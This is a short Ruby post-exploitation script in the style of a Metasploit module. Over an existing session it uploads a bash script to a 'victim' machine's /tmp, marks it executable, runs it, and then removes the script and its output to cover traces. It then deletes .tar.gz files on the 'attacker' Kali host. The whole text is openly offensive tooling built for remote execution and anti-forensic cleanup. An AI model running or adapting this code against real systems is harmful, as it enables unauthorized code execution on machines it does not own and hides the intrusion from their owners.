#def run_script(client)
# Define paths for the bash script and backup file
local_script = "/home/kali/Documents/backup.sh"           # Path to bash script on attacker
remote_script = "/tmp/backup.sh"                          # Path to upload script on victim

# Step 1: Upload the bash script to the victim machine
print_status("Uploading the backup script to the victim machine...")
if File.exist?(local_script)
  session.fs.file.upload_file(remote_script, local_script)
  print_good("Backup script uploaded successfully.")
else
  print_error("Local backup script does not exist.")
  return
end

# Step 2: Set the script as executable
print_status("Setting execute permissions for the script...")
cmd_exec("chmod +x #{remote_script}")
print_good("Execute permissions set.")

# Step 3: Execute the script on the victim machine
print_status("Executing the backup script on the victim machine...")
output = cmd_exec("bash #{remote_script}")
if output.nil? || output.empty?
  print_error("Failed to execute the script.")
  return
else
  print_good("Backup script executed successfully.")
end

# Step 4: Clean up the victim machine
print_status("Cleaning up temporary files on the victim machine...")
cmd_exec("rm -f #{remote_script} #{output}")
print_good("Temporary files cleaned up.")
#end

# Step 5: Clean up the attacker machine Downloads
# Path to the Downloads directory (update if needed)
downloads_dir = File.expand_path("/home/kali/Downloads")

# Get all .tar.gz files in the directory
tar_gz_files = Dir.glob(File.join(downloads_dir, "*.tar.gz"))

# Delete each .tar.gz file
tar_gz_files.each do |file|
  begin
    File.delete(file)
    puts "Deleted: #{file}"
  rescue => e
    puts "Error deleting #{file}: #{e.message}"
  end
end
